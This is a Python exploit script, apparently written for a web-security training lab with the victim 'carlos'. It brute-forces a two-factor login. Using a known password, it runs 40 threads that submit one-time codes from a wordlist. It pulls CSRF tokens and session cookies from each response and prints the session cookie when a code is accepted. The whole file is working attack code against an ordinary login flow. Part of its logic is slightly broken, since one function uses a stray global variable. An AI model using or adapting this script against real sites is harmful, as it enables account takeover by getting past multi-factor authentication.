import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if (len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = sys.argv[1]
victim = "carlos"
passwd = "montoya"

found = False
def get_req_one(url,otp):
    print("Get req one {0}".format(otp),end="\r",flush=True)
    res = []
    r1 = requests.get(url+'login',proxies=proxies,verify=False)
    #print(r1.text)
    res.append(r1)
    res.append(otp)
    return res
    
def post_req_one(url,data,headers,otp):
    print("Post req one {0}".format(otp),end="\r",flush=True)
    res = []
    r2 = requests.post(url+'login',data=data,headers=headers,proxies=proxies,verify=False, allow_redirects=False)
    #print(r2.text)
    res.append(r2)
    res.append(otp)
    return res
    
def get_req_two(url,headers,otp):
    #print("Get req two {0}".format(otp),end="\r",flush=True)
    res = []
    r3 = requests.get(url+'login2',headers=headers,proxies=proxies,verify=False)
    #print(r3.text)
    csrf = re.search('csrf"\ value="(.*?)">',r3.text).group(1)
    #print(csrf,end="\r",flush=True)
    data = {'csrf': csrf,'mfa-code': task.result()[1]}
    r4 = requests.post(url+'login2',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)
    print(r4.text)
    if "Incorrect security code" not in r4.text:
        print(r4.cookies)
        print(otp)
    res.append(r4)
    res.append(otp)
    return res

#def post_req_two(url,data,headers,otp):
#    print("Post req two {0}".format(otp),end="\r",flush=True)
#    res = []
#    r4 = requests.post(url+'login2',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)
#    print(r4.text)
#    if "Incorrect security code" not in r4.text:
#        print(r4.cookies)
#        print(otp)

file1 = open('creds/otp_pay','r')
otps = file1.readlines()


processes1 = []
i = 1
with ThreadPoolExecutor(max_workers=40) as executor:
    for otp in otps:
        print("{}".format(i),end="\r",flush=True)
        i = i + 1
        processes1.append(executor.submit(get_req_one,url,otp))

i = 1     
processes2 = []
with ThreadPoolExecutor(max_workers=40) as executor:
    for task in as_completed(processes1):
        print("{}".format(i),end="\r",flush=True)
        i = i + 1
        #print(task.result())
        cookie_value = task.result()[0].cookies['session']
        csrf = re.search('csrf"\ value="(.*?)">',task.result()[0].text).group(1)
    
        headers = {'Cookie': 'session='+cookie_value}
        data = {'csrf':csrf,'username':victim,'password':passwd}
        processes2.append(executor.submit(post_req_one,url,data,headers,task.result()[1]))

i = 1        
processes3 = []
with ThreadPoolExecutor(max_workers=40) as executor:
    for task in as_completed(processes2):
        print("{}".format(i),end="\r",flush=True)
        i = i + 1
        if "Invalid username or password." not in task.result()[0].text:
            cookie_value = task.result()[0].cookies['session']
            headers = {'Cookie': 'session='+cookie_value}
            processes3.append(executor.submit(get_req_two,url,headers,task.result()[1]))

#i = 1
#processes4 = []
#with ThreadPoolExecutor(max_workers=40) as executor:
 #   for task in as_completed(processes3):
 #       print("{}".format(i),end="\r",flush=True)
 #       i = i + 1
 #       csrf = re.search('csrf"\ value="(.*?)">',task.result()[0].text).group(1)
  #      print(csrf)
 #       data = {'csrf': csrf,'mfa-code': task.result()[1]}
 #       processes4.append(executor.submit(post_req_two,url,data,headers,task.result()[1]))
    


    

